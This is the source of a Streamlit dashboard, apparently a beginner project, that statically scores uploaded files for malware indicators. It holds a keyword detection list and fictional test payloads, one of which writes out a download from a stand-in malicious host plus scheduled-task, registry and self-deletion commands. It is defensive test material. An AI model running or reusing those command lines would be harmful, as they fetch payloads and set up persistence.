"""
ThreatLens - Static File Security Analyzer
A beginner-friendly cybersecurity dashboard built with Streamlit.
"""

import streamlit as st
import hashlib
import math
import datetime
from pathlib import Path
from typing import Optional

# ── Page configuration ──────────────────────────────────────────────────────
st.set_page_config(
    page_title="ThreatLens",
    page_icon="🔍",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Dark-theme CSS ───────────────────────────────────────────────────────────
st.markdown(
    """
    <style>
    /* Global background */
    html, body, [data-testid="stAppViewContainer"] {
        background-color: #0d1117;
        color: #e6edf3;
    }
    [data-testid="stHeader"] { background-color: #0d1117; }

    /* Stat cards */
    .stat-card {
        background: #161b22;
        border: 1px solid #30363d;
        border-radius: 10px;
        padding: 20px 24px;
        text-align: center;
    }
    .stat-label { color: #8b949e; font-size: 13px; margin-bottom: 6px; }
    .stat-value { font-size: 36px; font-weight: 700; }
    .color-blue   { color: #58a6ff; }
    .color-green  { color: #3fb950; }
    .color-yellow { color: #d29922; }
    .color-red    { color: #f85149; }

    /* Result card */
    .result-card {
        background: #161b22;
        border: 1px solid #30363d;
        border-radius: 10px;
        padding: 20px 24px;
        margin-top: 12px;
    }

    /* Risk badge */
    .badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 20px;
        font-size: 13px;
        font-weight: 600;
    }
    .badge-low      { background:#1a3a2a; color:#3fb950; border:1px solid #3fb950; }
    .badge-medium   { background:#3a2e0a; color:#d29922; border:1px solid #d29922; }
    .badge-high     { background:#3a1a1a; color:#f85149; border:1px solid #f85149; }
    .badge-critical { background:#2d1a3a; color:#bf7fff; border:1px solid #bf7fff; }
    .color-purple { color: #bf7fff; }

    /* Upload area */
    [data-testid="stFileUploader"] {
        background: #161b22;
        border: 2px dashed #30363d;
        border-radius: 10px;
        padding: 12px;
    }

    /* Divider */
    hr { border-color: #30363d; }

    /* Hide Streamlit branding */
    #MainMenu, footer { visibility: hidden; }
    </style>
    """,
    unsafe_allow_html=True,
)


# ── Session-state initialisation ─────────────────────────────────────────────
if "total_scanned" not in st.session_state:
    st.session_state.total_scanned   = 0
if "low_risk"      not in st.session_state:
    st.session_state.low_risk        = 0
if "suspicious"    not in st.session_state:
    st.session_state.suspicious      = 0
if "high_risk"     not in st.session_state:
    st.session_state.high_risk       = 0
if "scan_history"  not in st.session_state:
    st.session_state.scan_history    = []


# ════════════════════════════════════════════════════════════════════════════
#  ANALYSIS HELPERS
# ════════════════════════════════════════════════════════════════════════════

# Known dangerous file extensions
DANGEROUS_EXTENSIONS = {
    ".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".jar",
    ".msi", ".scr", ".pif", ".com", ".dll", ".sh", ".py",
    ".rb", ".php", ".asp", ".aspx", ".jsp", ".wsf", ".hta",
}

# Magic-byte signatures: (hex_prefix, real_type_label)
# We map known signatures so we can detect extension mismatches.
MAGIC_SIGNATURES = [
    (b"\x4d\x5a",                     "Windows PE/EXE"),
    (b"\x7f\x45\x4c\x46",             "ELF Executable (Linux/Unix)"),
    (b"\x50\x4b\x03\x04",             "ZIP / Office Document"),
    (b"\x25\x50\x44\x46",             "PDF"),
    (b"\xff\xd8\xff",                  "JPEG Image"),
    (b"\x89\x50\x4e\x47",             "PNG Image"),
    (b"\x47\x49\x46\x38",             "GIF Image"),
    (b"\x52\x49\x46\x46",             "RIFF (AVI/WAV)"),
    (b"\x66\x74\x79\x70",             "MP4/MOV Video"),      # after 4-byte offset
    (b"\xd0\xcf\x11\xe0",             "MS Office (legacy)"),
    (b"\x1f\x8b",                      "GZIP Archive"),
    (b"\x42\x5a\x68",                  "BZIP2 Archive"),
    (b"\xfd\x37\x7a\x58\x5a\x00",     "XZ Archive"),
    (b"\x37\x7a\xbc\xaf\x27\x1c",     "7-Zip Archive"),
    (b"\x52\x61\x72\x21",              "RAR Archive"),
    (b"\x4d\x5a\x90\x00",             "Windows PE/EXE (detailed)"),
]


def sha256_hash(data: bytes) -> str:
    """Return the SHA-256 hex digest of raw bytes."""
    return hashlib.sha256(data).hexdigest()


def detect_magic(data: bytes) -> Optional[str]:
    """
    Compare the first bytes of the file against known magic signatures.
    Returns a human-readable type string, or None if unknown.
    """
    for signature, label in MAGIC_SIGNATURES:
        if data[:len(signature)] == signature:
            return label
        # MP4 magic can start at offset 4
        if signature == b"\x66\x74\x79\x70" and data[4:8] == signature:
            return label
    return None


def calculate_entropy(data: bytes) -> float:
    """
    Shannon entropy of the byte distribution (0–8 bits/byte).
    High entropy (> 7.0) often indicates encryption or packing.
    """
    if not data:
        return 0.0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    length = len(data)
    entropy = 0.0
    for count in freq:
        if count:
            p = count / length
            entropy -= p * math.log2(p)
    return round(entropy, 4)


def check_extension_mismatch(filename: str, magic_type: Optional[str]) -> Optional[str]:
    """
    Return a warning string when the detected magic type conflicts with
    the declared file extension, e.g. a .jpg that is actually a PE binary.
    """
    if magic_type is None:
        return None

    ext = Path(filename).suffix.lower()

    # Executable content hidden inside innocent-looking extensions
    executable_magic = {"Windows PE/EXE", "ELF Executable (Linux/Unix)",
                        "Windows PE/EXE (detailed)"}
    image_extensions  = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
                         ".tiff", ".svg"}
    doc_extensions    = {".pdf", ".doc", ".docx", ".xls", ".xlsx",
                         ".ppt", ".pptx", ".txt", ".csv"}

    if magic_type in executable_magic and ext in image_extensions | doc_extensions:
        return (
            f"⚠ Extension mismatch: declared as `{ext}` but file header "
            f"matches **{magic_type}**. This is a common malware disguise technique."
        )

    # Script hiding as document
    if ext in {".pdf", ".jpg", ".png"} and magic_type == "ZIP / Office Document":
        return (
            f"⚠ Extension mismatch: declared as `{ext}` but content is a "
            f"**ZIP / Office archive**. Could be a polyglot file."
        )

    return None


def find_suspicious_strings(data: bytes) -> list:
    """
    Scan raw bytes for strings commonly associated with malicious behaviour.
    Returns a list of human-readable findings.
    """
    findings = []
    try:
        text = data.decode("latin-1")  # latin-1 is lossless for raw bytes
    except Exception:
        return findings

    checks = {
        "cmd.exe / powershell invocation":
            any(s in text.lower() for s in ["cmd.exe", "powershell", "powershell.exe"]),
        "WScript / CScript engine":
            any(s in text.lower() for s in ["wscript", "cscript"]),
        "Base64-encoded payload hint":
            "base64" in text.lower() or "frombase64string" in text.lower(),
        "Network download (URLDownloadToFile / WebClient)":
            any(s in text.lower() for s in
                ["urldownloadtofile", "webclient", "downloadstring",
                 "invoke-webrequest", "wget", "curl "]),
        "Registry modification (RegOpenKey / reg add)":
            any(s in text.lower() for s in ["regopenkey", "regsetvalue", "reg add"]),
        "Shell execution (ShellExecute / CreateProcess)":
            any(s in text.lower() for s in ["shellexecute", "createprocess"]),
        "Scheduled task creation (schtasks)":
            "schtasks" in text.lower(),
        "Credential / password keyword":
            any(s in text.lower() for s in ["password", "passwd", "credential"]),
        "Self-deletion pattern":
            any(s in text.lower() for s in ["del %0", "del %~f0", "self-delete"]),
    }

    for label, matched in checks.items():
        if matched:
            findings.append(label)

    return findings


def determine_risk(
    entropy: float,
    dangerous_ext: bool,
    suspicious_strings: list,
    mismatch: Optional[str],
) -> tuple:
    """
    Combine all signals into a single risk level + plain-English explanation.
    Returns (risk_level, explanation)  where risk_level is 'Low'/'Medium'/'High'.
    """
    score = 0
    reasons = []

    if dangerous_ext:
        score += 3
        reasons.append("file extension is known to be executable or scriptable")
    if mismatch:
        score += 4
        reasons.append("file-extension mismatch detected (common malware disguise)")
    if len(suspicious_strings) >= 3:
        score += 3
        reasons.append(f"{len(suspicious_strings)} suspicious string patterns found")
    elif len(suspicious_strings) >= 1:
        score += 1
        reasons.append(f"{len(suspicious_strings)} suspicious string pattern(s) found")
    if entropy > 7.2:
        score += 2
        reasons.append(f"very high entropy ({entropy}) suggesting encryption or packing")
    elif entropy > 6.5:
        score += 1
        reasons.append(f"elevated entropy ({entropy}) suggesting possible obfuscation")

    if score >= 5:
        level = "High"
    elif score >= 2:
        level = "Medium"
    else:
        level = "Low"

    explanation = (
        "No significant threats detected."
        if not reasons
        else "Risk factors: " + "; ".join(reasons) + "."
    )
    return level, explanation


# ════════════════════════════════════════════════════════════════════════════
#  THREAT INDICATOR CORRELATION ENGINE (TICE)
# ════════════════════════════════════════════════════════════════════════════

# ── Known-hash list ───────────────────────────────────────────────────────────
# These are SHA-256 hashes of the FICTIONAL payloads defined in SAMPLE_FILES
# below.  They are pre-computed from harmless test bytes and are used only to
# demonstrate hash-lookup detection.  They are NOT hashes of real malware.
# Label format: (sha256_hex, description)
KNOWN_TEST_HASHES = {
    # hash of b"\x4d\x5a\x90\x00" + b"powershell.exe ..." (dropper.exe sample)
    # Computed deterministically from the fictional SAMPLE_FILES payload.
    # Re-run sha256_hash(SAMPLE_FILES[9]["content"]) to verify.
    "PLACEHOLDER_DROPPER": "FICTIONAL — dropper.exe test payload",
    # hash of photo_vacation.jpg mismatch payload
    "PLACEHOLDER_MISMATCH": "FICTIONAL — photo_vacation.jpg mismatch payload",
}
# Note: placeholders are replaced at runtime below once SAMPLE_FILES is defined.


# ── Scoring rules ─────────────────────────────────────────────────────────────
# Each rule is a dict:
#   name        – short label shown in the findings table
#   points      – score added when rule fires (0-100 scale)
#   description – plain-English explanation shown to the user
#
# Rules are evaluated in order.  A rule fires at most ONCE per file.
# The total score is capped at 100.

TICE_RULES = [
    {
        "id":          "sig_mismatch",
        "name":        "File-Signature Mismatch",
        "points":      40,
        "description": "File extension does not match the detected file header (magic bytes). "
                       "A common technique used to disguise executables as documents or images.",
    },
    {
        "id":          "known_hash",
        "name":        "Known-Hash Match",
        "points":      35,
        "description": "SHA-256 hash matches an entry in the local test-hash list. "
                       "(In production this would indicate a previously flagged file.)",
    },
    {
        "id":          "double_ext",
        "name":        "Suspicious Double Extension",
        "points":      25,
        "description": "Filename contains a double extension (e.g. invoice.pdf.exe). "
                       "Attackers use this to make executables appear to be documents.",
    },
    {
        "id":          "dangerous_ext",
        "name":        "Dangerous File Extension",
        "points":      15,
        "description": "The file extension belongs to a category that can execute code "
                       "(e.g. .exe, .ps1, .bat, .js).",
    },
    {
        "id":          "sus_strings_high",
        "name":        "Multiple Suspicious Patterns (≥3)",
        "points":      20,
        "description": "Three or more suspicious string patterns found (e.g. PowerShell, "
                       "download URLs, registry edits, scheduled tasks).",
    },
    {
        "id":          "sus_strings_low",
        "name":        "Suspicious Pattern Detected (1–2)",
        "points":      10,
        "description": "One or two suspicious string patterns found.",
    },
    {
        "id":          "high_entropy",
        "name":        "Very High Entropy (>7.2 bits/byte)",
        "points":      15,
        "description": "Byte entropy is extremely high, suggesting the file content is "
                       "encrypted, packed, or obfuscated.",
    },
    {
        "id":          "elevated_entropy",
        "name":        "Elevated Entropy (6.5–7.2 bits/byte)",
        "points":      8,
        "description": "Byte entropy is above average, suggesting possible compression "
                       "or light obfuscation.",
    },
]

# ── Classification thresholds ─────────────────────────────────────────────────
# Score  0–19  → Low
# Score 20–49  → Medium
# Score 50–74  → High
# Score 75–100 → Critical
TICE_THRESHOLDS = [
    (75, "Critical"),
    (50, "High"),
    (20, "Medium"),
    (0,  "Low"),
]

# ── Recommended next steps per classification ────────────────────────────────
TICE_RECOMMENDATIONS = {
    "Low":      "No immediate action required. File appears benign based on available indicators.",
    "Medium":   "Review flagged indicators manually. Consider sandboxing before opening.",
    "High":     "Do not open. Quarantine file and escalate to security team for further analysis.",
    "Critical": "Immediate isolation required. Submit to incident response. Do not open on any system.",
}


def check_double_extension(filename: str) -> bool:
    """
    Return True when a filename has a dangerous extension hidden behind
    another extension, e.g. 'invoice.pdf.exe' or 'photo.jpg.bat'.
    """
    parts = Path(filename).name.split(".")
    # Need at least 3 parts: stem + two extensions (e.g. ['invoice','pdf','exe'])
    if len(parts) < 3:
        return False
    # The last extension is the real one; check if it is dangerous
    last_ext = "." + parts[-1].lower()
    # Second-to-last extension should look like a legitimate document type
    penultimate_ext = "." + parts[-2].lower()
    safe_looking = {".pdf", ".doc", ".docx", ".xls", ".xlsx", ".jpg",
                    ".jpeg", ".png", ".txt", ".csv", ".mp4", ".zip"}
    return last_ext in DANGEROUS_EXTENSIONS and penultimate_ext in safe_looking


def tice_score(
    filename: str,
    file_hash: str,
    entropy: float,
    magic_type: Optional[str],
    sus_strings: list,
    known_hashes: dict,
) -> tuple:
    """
    Evaluate all TICE rules against the provided indicators.
    Returns (score, classification, triggered_rules, recommendation) where:
      score           – int 0–100
      classification  – 'Low' | 'Medium' | 'High' | 'Critical'
      triggered_rules – list of dicts {name, points, description}
      recommendation  – plain-English next step
    """
    triggered = []
    total     = 0
    fired_ids = set()   # prevent double-counting related rules

    mismatch    = check_extension_mismatch(filename, magic_type)
    double_ext  = check_double_extension(filename)
    dangerous   = Path(filename).suffix.lower() in DANGEROUS_EXTENSIONS

    for rule in TICE_RULES:
        rid = rule["id"]
        if rid in fired_ids:
            continue

        fires = False

        if rid == "sig_mismatch" and mismatch:
            fires = True
        elif rid == "known_hash" and file_hash in known_hashes:
            fires = True
        elif rid == "double_ext" and double_ext:
            fires = True
        elif rid == "dangerous_ext" and dangerous:
            fires = True
        elif rid == "sus_strings_high" and len(sus_strings) >= 3:
            fires = True
            fired_ids.add("sus_strings_low")   # don't also count the lower tier
        elif rid == "sus_strings_low" and len(sus_strings) >= 1:
            fires = True
        elif rid == "high_entropy" and entropy > 7.2:
            fires = True
            fired_ids.add("elevated_entropy")  # don't also count the lower tier
        elif rid == "elevated_entropy" and entropy > 6.5:
            fires = True

        if fires:
            triggered.append({
                "name":        rule["name"],
                "points":      rule["points"],
                "description": rule["description"],
            })
            total += rule["points"]
            fired_ids.add(rid)

    # Cap score at 100
    total = min(total, 100)

    # Classify
    classification = "Low"
    for threshold, label in TICE_THRESHOLDS:
        if total >= threshold:
            classification = label
            break

    recommendation = TICE_RECOMMENDATIONS[classification]
    return total, classification, triggered, recommendation


def run_tice(data: bytes, filename: str, known_hashes: dict) -> dict:
    """
    Full TICE pipeline for a bytes payload + filename.
    Returns a structured result dict ready for display and reporting.
    Never executes the file — only inspects bytes.
    """
    file_hash   = sha256_hash(data)
    entropy     = calculate_entropy(data)
    magic_type  = detect_magic(data)
    sus_strings = find_suspicious_strings(data)

    score, classification, triggered, recommendation = tice_score(
        filename, file_hash, entropy, magic_type, sus_strings, known_hashes
    )

    return {
        "filename":       filename,
        "file_size":      len(data),
        "sha256":         file_hash,
        "entropy":        entropy,
        "magic_type":     magic_type or "Unknown / plain text",
        "sus_strings":    sus_strings,
        "score":          score,
        "classification": classification,
        "triggered":      triggered,
        "recommendation": recommendation,
        "analysed_at":    datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "simulated":      False,
    }


def build_tice_report(findings: list, known_hashes: dict) -> str:
    """Build a downloadable plain-text investigation report."""
    lines = [
        "=" * 70,
        "  ThreatLens — Threat Indicator Correlation Engine (TICE) Report",
        f"  Generated : {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
        "  Disclaimer: Heuristic scores indicate risk indicators only.",
        "              They do not constitute proof of malicious intent.",
        "=" * 70,
        "",
    ]
    for i, f in enumerate(findings, 1):
        sim_tag = "  [SIMULATED — not a real file scan]" if f.get("simulated") else ""
        lines += [
            f"[Finding {i}] {f['filename']}{sim_tag}",
            f"  Classification : {f['classification']}",
            f"  Risk Score     : {f['score']} / 100",
            f"  SHA-256        : {f['sha256']}",
            f"  File Size      : {f['file_size']:,} bytes",
            f"  Entropy        : {f['entropy']} bits/byte",
            f"  Detected Type  : {f['magic_type']}",
            f"  Recommendation : {f['recommendation']}",
            "  Triggered Rules:",
        ]
        if f["triggered"]:
            for rule in f["triggered"]:
                lines.append(f"    + [{rule['points']:>3} pts] {rule['name']}")
                lines.append(f"           {rule['description']}")
        else:
            lines.append("    (none — file passed all checks)")
        lines += [f"  Analysed At    : {f['analysed_at']}", ""]

    # Scoring reference
    lines += [
        "-" * 70,
        "SCORING REFERENCE",
        "  Rule                              Points",
        "  --------------------------------  ------",
    ]
    for rule in TICE_RULES:
        lines.append(f"  {rule['name']:<34}{rule['points']:>6}")
    lines += [
        "",
        "CLASSIFICATION THRESHOLDS",
        "  Score   0–19  → Low",
        "  Score  20–49  → Medium",
        "  Score  50–74  → High",
        "  Score  75–100 → Critical",
        "",
        "KNOWN-HASH LIST",
        f"  {len(known_hashes)} entry/entries (fictional test hashes only)",
        "=" * 70,
    ]
    return "\n".join(lines)


def analyse_file(uploaded_file) -> dict:
    """
    Run all static checks on an uploaded file and return a results dict.
    NOTE: The file is NEVER executed — only its raw bytes are inspected.
    """
    data      = uploaded_file.read()
    filename  = uploaded_file.name
    file_size = len(data)
    ext       = Path(filename).suffix.lower()

    file_hash    = sha256_hash(data)
    entropy      = calculate_entropy(data)
    magic_type   = detect_magic(data)
    mismatch     = check_extension_mismatch(filename, magic_type)
    sus_strings  = find_suspicious_strings(data)
    dangerous_ext = ext in DANGEROUS_EXTENSIONS

    risk_level, explanation = determine_risk(
        entropy, dangerous_ext, sus_strings, mismatch
    )

    return {
        "filename":       filename,
        "file_size":      file_size,
        "sha256":         file_hash,
        "entropy":        entropy,
        "magic_type":     magic_type or "Unknown / plain text",
        "extension":      ext or "(none)",
        "dangerous_ext":  dangerous_ext,
        "mismatch":       mismatch,
        "sus_strings":    sus_strings,
        "risk_level":     risk_level,
        "explanation":    explanation,
        "scanned_at":     datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
    }


# ════════════════════════════════════════════════════════════════════════════
#  REPORT GENERATION
# ════════════════════════════════════════════════════════════════════════════

def build_report(results: list) -> str:
    """Produce a plain-text / JSON security report for download."""
    report_lines = [
        "=" * 60,
        "  ThreatLens — Security Analysis Report",
        f"  Generated: {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
        "=" * 60,
        "",
    ]
    for i, r in enumerate(results, 1):
        report_lines += [
            f"[File {i}] {r['filename']}",
            f"  Risk Level  : {r['risk_level']}",
            f"  SHA-256     : {r['sha256']}",
            f"  File Size   : {r['file_size']:,} bytes",
            f"  Entropy     : {r['entropy']} bits/byte",
            f"  Magic Type  : {r['magic_type']}",
            f"  Extension   : {r['extension']}",
            f"  Explanation : {r['explanation']}",
        ]
        if r["mismatch"]:
            report_lines.append(f"  ⚠ Mismatch  : {r['mismatch']}")
        if r["sus_strings"]:
            report_lines.append(
                "  Suspicious  : " + " | ".join(r["sus_strings"])
            )
        report_lines += ["  Scanned At  : " + r["scanned_at"], ""]
    report_lines += [
        "-" * 60,
        "Summary",
        f"  Total scanned : {st.session_state.total_scanned}",
        f"  Low risk      : {st.session_state.low_risk}",
        f"  Suspicious    : {st.session_state.suspicious}",
        f"  High risk     : {st.session_state.high_risk}",
        "=" * 60,
    ]
    return "\n".join(report_lines)


# ════════════════════════════════════════════════════════════════════════════
#  FICTIONAL TEST PAYLOADS  (referenced by both Sample Data Lab and TICE)
# ════════════════════════════════════════════════════════════════════════════
# "content" is a small bytes payload carefully crafted to trigger (or not
# trigger) specific detection rules — no real malware, just pattern bytes.

SAMPLE_FILES = [
    {
        "name": "readme.txt",
        "content": b"Hello, this is a plain text document.\nNothing suspicious here.\n",
    },
    {
        "name": "holiday_photo.jpg",
        # Real JPEG magic bytes — clean image, no mismatch
        "content": b"\xff\xd8\xff\xe0" + b"\x00" * 200,
    },
    {
        "name": "project_report.pdf",
        # Real PDF magic bytes
        "content": b"%PDF-1.4\n%Some fictional PDF content.\n",
    },
    {
        "name": "invoice.docx",
        # ZIP/Office magic (OOXML is a ZIP internally) — clean
        "content": b"\x50\x4b\x03\x04" + b"\x00" * 200,
    },
    {
        "name": "backup_tool.exe",
        # Windows PE magic — dangerous extension matches content (honest EXE)
        "content": b"\x4d\x5a\x90\x00" + b"\x00" * 200,
    },
    {
        "name": "photo_vacation.jpg",
        # EXTENSION MISMATCH: .jpg extension but PE/EXE magic bytes inside
        "content": b"\x4d\x5a\x90\x00This looks like an image but is actually an executable.",
    },
    {
        "name": "update_script.ps1",
        # PowerShell script with suspicious keywords
        "content": (
            b"# Fictional update script\n"
            b"powershell.exe -Command DownloadString('http://example.com/payload')\n"
            b"$client = New-Object System.Net.WebClient\n"
            b"schtasks /create /tn 'Update' /tr 'cmd.exe'\n"
            b"reg add HKCU\\Software\\Microsoft\\Windows\n"
        ),
    },
    {
        "name": "data_dump.bin",
        # High-entropy binary blob — simulates encrypted or packed data
        "content": bytes([(i * 131 + 73) % 256 for i in range(1024)]),
    },
    {
        "name": "safe_document.pdf",
        # EXTENSION MISMATCH: .pdf extension but ZIP magic inside
        "content": b"\x50\x4b\x03\x04" + b"This archive is pretending to be a PDF.",
    },
    {
        "name": "dropper.exe",
        # PE magic + multiple suspicious strings — highest risk score
        "content": (
            b"\x4d\x5a\x90\x00"
            b"powershell.exe -EncodedCommand "
            b"URLDownloadToFile http://malicious.example/payload.exe "
            b"cmd.exe /c schtasks /create "
            b"reg add HKLM\\Software "
            b"ShellExecute CreateProcess "
            b"password=admin del %0"
        ),
    },
]

# ── Populate KNOWN_TEST_HASHES with real hashes from the payloads above ──────
# These replace the placeholder strings defined earlier.
# Both hashes are of fictional byte sequences — NOT real malware.
KNOWN_TEST_HASHES = {
    sha256_hash(SAMPLE_FILES[9]["content"]): "FICTIONAL — dropper.exe test payload",
    sha256_hash(SAMPLE_FILES[5]["content"]): "FICTIONAL — photo_vacation.jpg mismatch payload",
}


# ════════════════════════════════════════════════════════════════════════════
#  UI — HEADER
# ════════════════════════════════════════════════════════════════════════════

st.markdown(
    """
    <h1 style='color:#58a6ff; margin-bottom:2px;'>🔍 ThreatLens</h1>
    <p style='color:#8b949e; font-size:15px; margin-top:0;'>
        Static file security analyser — upload a file to inspect its hash,
        entropy, magic bytes, and suspicious patterns.
        <strong style='color:#f85149;'>No files are executed.</strong>
    </p>
    <hr>
    """,
    unsafe_allow_html=True,
)

# ── Stat cards ───────────────────────────────────────────────────────────────
c1, c2, c3, c4 = st.columns(4)

cards = [
    (c1, "Total Files Scanned",        st.session_state.total_scanned, "color-blue"),
    (c2, "Low-Risk Files",             st.session_state.low_risk,      "color-green"),
    (c3, "Suspicious Files (Medium)",  st.session_state.suspicious,    "color-yellow"),
    (c4, "High-Risk Indicators",       st.session_state.high_risk,     "color-red"),
]

for col, label, value, color_class in cards:
    with col:
        st.markdown(
            f"""
            <div class="stat-card">
              <div class="stat-label">{label}</div>
              <div class="stat-value {color_class}">{value}</div>
            </div>
            """,
            unsafe_allow_html=True,
        )

st.markdown("<br>", unsafe_allow_html=True)

# ════════════════════════════════════════════════════════════════════════════
#  UI — UPLOAD & ANALYSIS
# ════════════════════════════════════════════════════════════════════════════

st.markdown("### 📂 Upload File for Analysis")
st.markdown(
    "<p style='color:#8b949e; font-size:13px;'>"
    "Supports any file type. Maximum size: 200 MB. "
    "Files are analysed in memory and are never saved to disk."
    "</p>",
    unsafe_allow_html=True,
)

uploaded = st.file_uploader(
    label="Drop a file here or click to browse",
    type=None,            # Accept every file type
    label_visibility="collapsed",
)

if uploaded is not None:
    with st.spinner("🔍 Analysing file…"):
        try:
            result = analyse_file(uploaded)
        except Exception as exc:
            st.error(f"Analysis failed: {exc}")
            st.stop()

    # ── Update session counters ──────────────────────────────────────────
    st.session_state.total_scanned += 1
    if result["risk_level"] == "Low":
        st.session_state.low_risk += 1
    elif result["risk_level"] == "Medium":
        st.session_state.suspicious += 1
    else:
        st.session_state.high_risk += 1

    # Keep last 20 scans for the report
    st.session_state.scan_history.append(result)
    st.session_state.scan_history = st.session_state.scan_history[-20:]

    # ── Risk badge colour ────────────────────────────────────────────────
    badge_class = {
        "Low":    "badge-low",
        "Medium": "badge-medium",
        "High":   "badge-high",
    }[result["risk_level"]]

    risk_icon = {"Low": "✅", "Medium": "⚠️", "High": "🚨"}[result["risk_level"]]

    # ── Result card ──────────────────────────────────────────────────────
    st.markdown("### 📋 Analysis Results")
    st.markdown(
        f"""
        <div class="result-card">
          <div style="display:flex; justify-content:space-between; align-items:center;">
            <span style="font-size:17px; font-weight:600;">
              {risk_icon} {result['filename']}
            </span>
            <span class="badge {badge_class}">{result['risk_level']} Risk</span>
          </div>
          <p style="color:#8b949e; font-size:13px; margin:8px 0 0;">
            {result['explanation']}
          </p>
        </div>
        """,
        unsafe_allow_html=True,
    )

    # ── Detail columns ───────────────────────────────────────────────────
    st.markdown("<br>", unsafe_allow_html=True)
    d1, d2 = st.columns(2)

    with d1:
        st.markdown("#### 🔒 File Identity")
        st.markdown(
            f"""
            | Property | Value |
            |---|---|
            | **SHA-256** | `{result['sha256'][:32]}…` |
            | **Size** | {result['file_size']:,} bytes |
            | **Extension** | `{result['extension']}` |
            | **Detected Type** | {result['magic_type']} |
            | **Scanned At** | {result['scanned_at']} |
            """
        )

    with d2:
        st.markdown("#### 📊 Entropy Analysis")
        st.progress(
            min(result["entropy"] / 8.0, 1.0),
        )
        entropy_label = (
            "🟢 Normal (likely plain text or source code)"
            if result["entropy"] < 5.0
            else "🟡 Elevated (possible compression)"
            if result["entropy"] < 6.5
            else "🟠 High (compression or encoding)"
            if result["entropy"] < 7.2
            else "🔴 Very High (likely encrypted or packed)"
        )
        st.markdown(
            f"**{result['entropy']} bits/byte** — {entropy_label}"
        )

        st.markdown("#### 🏷 Extension Risk")
        if result["dangerous_ext"]:
            st.warning(
                f"`{result['extension']}` is an executable/scriptable extension."
            )
        else:
            st.success(f"`{result['extension']}` is a low-risk extension.")

    # ── Mismatch warning ─────────────────────────────────────────────────
    if result["mismatch"]:
        st.error(result["mismatch"])

    # ── Suspicious strings ───────────────────────────────────────────────
    st.markdown("#### 🕵️ Suspicious Pattern Scan")
    if result["sus_strings"]:
        st.error(
            f"**{len(result['sus_strings'])} suspicious pattern(s) detected:**"
        )
        for s in result["sus_strings"]:
            st.markdown(f"- {s}")
    else:
        st.success("No suspicious string patterns found.")

    # ── Full SHA-256 (expandable) ────────────────────────────────────────
    with st.expander("🔑 Full SHA-256 Hash"):
        st.code(result["sha256"], language="text")

    # ── Rerun to refresh counters ────────────────────────────────────────
    st.rerun()

# ════════════════════════════════════════════════════════════════════════════
#  UI — REPORT DOWNLOAD
# ════════════════════════════════════════════════════════════════════════════

if st.session_state.scan_history:
    st.markdown("---")
    st.markdown("### 📥 Download Security Report")
    report_text = build_report(st.session_state.scan_history)
    st.download_button(
        label="⬇ Download Report (.txt)",
        data=report_text.encode("utf-8"),
        file_name=f"threatlens_report_{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt",
        mime="text/plain",
    )

# ════════════════════════════════════════════════════════════════════════════
#  UI — THREAT INDICATOR CORRELATION ENGINE (TICE)
# ════════════════════════════════════════════════════════════════════════════

st.markdown("---")
st.markdown("### 🛡 Threat Indicator Correlation Engine")
st.markdown(
    "<p style='color:#8b949e; font-size:13px;'>"
    "Rule-based engine that correlates multiple static indicators into a single "
    "transparent risk score (0–100). Upload a file above to run TICE analysis, "
    "or use <strong>Generate Test Cases</strong> to try simulated scenarios. "
    "<strong style='color:#f85149;'>Scores are heuristic — they flag indicators "
    "for review, not proof of malice.</strong>"
    "</p>",
    unsafe_allow_html=True,
)

# ── TICE session state ────────────────────────────────────────────────────
if "tice_findings"   not in st.session_state:
    st.session_state.tice_findings   = []   # all TICE results (real + simulated)
if "tice_analysed"   not in st.session_state:
    st.session_state.tice_analysed   = 0    # total files through TICE
if "tice_review"     not in st.session_state:
    st.session_state.tice_review     = 0    # Medium+
if "tice_high"       not in st.session_state:
    st.session_state.tice_high       = 0    # High
if "tice_critical"   not in st.session_state:
    st.session_state.tice_critical   = 0    # Critical

# ── TICE dashboard cards ──────────────────────────────────────────────────
t1, t2, t3, t4 = st.columns(4)
tice_cards = [
    (t1, "Files Analysed",       st.session_state.tice_analysed, "color-blue"),
    (t2, "Require Review",       st.session_state.tice_review,   "color-yellow"),
    (t3, "High-Risk Findings",   st.session_state.tice_high,     "color-red"),
    (t4, "Critical Findings",    st.session_state.tice_critical, "color-purple"),
]
for col, label, value, color_class in tice_cards:
    with col:
        st.markdown(
            f"""
            <div class="stat-card">
              <div class="stat-label">{label}</div>
              <div class="stat-value {color_class}">{value}</div>
            </div>
            """,
            unsafe_allow_html=True,
        )

st.markdown("<br>", unsafe_allow_html=True)

# ── TICE upload analysis (fires when a file was just uploaded) ────────────
# We re-use the result already computed by analyse_file above (stored in
# scan_history). When a new upload is detected we run it through TICE too.
if st.session_state.scan_history:
    latest = st.session_state.scan_history[-1]
    # Only run TICE on entries that don't yet have a tice result
    already_ticed = {f["sha256"] for f in st.session_state.tice_findings}
    if latest["sha256"] not in already_ticed and not latest.get("simulated"):
        # Rebuild bytes-level data we need (hash already computed)
        tice_result = {
            "filename":       latest["filename"],
            "file_size":      latest["file_size"],
            "sha256":         latest["sha256"],
            "entropy":        latest["entropy"],
            "magic_type":     latest["magic_type"],
            "sus_strings":    latest["sus_strings"],
            "analysed_at":    latest["scanned_at"],
            "simulated":      False,
        }
        # Run scoring using already-computed indicators
        score, classification, triggered, recommendation = tice_score(
            latest["filename"],
            latest["sha256"],
            latest["entropy"],
            latest["magic_type"] if latest["magic_type"] != "Unknown / plain text" else None,
            latest["sus_strings"],
            KNOWN_TEST_HASHES,
        )
        tice_result["score"]          = score
        tice_result["classification"] = classification
        tice_result["triggered"]      = triggered
        tice_result["recommendation"] = recommendation

        st.session_state.tice_findings.append(tice_result)
        st.session_state.tice_analysed += 1
        if classification in ("Medium", "High", "Critical"):
            st.session_state.tice_review += 1
        if classification == "High":
            st.session_state.tice_high += 1
        if classification == "Critical":
            st.session_state.tice_critical += 1

# ── Generate Test Cases button ────────────────────────────────────────────
st.markdown("#### 🧬 Test Cases")
st.caption(
    "Simulated cases exercise every detection rule. "
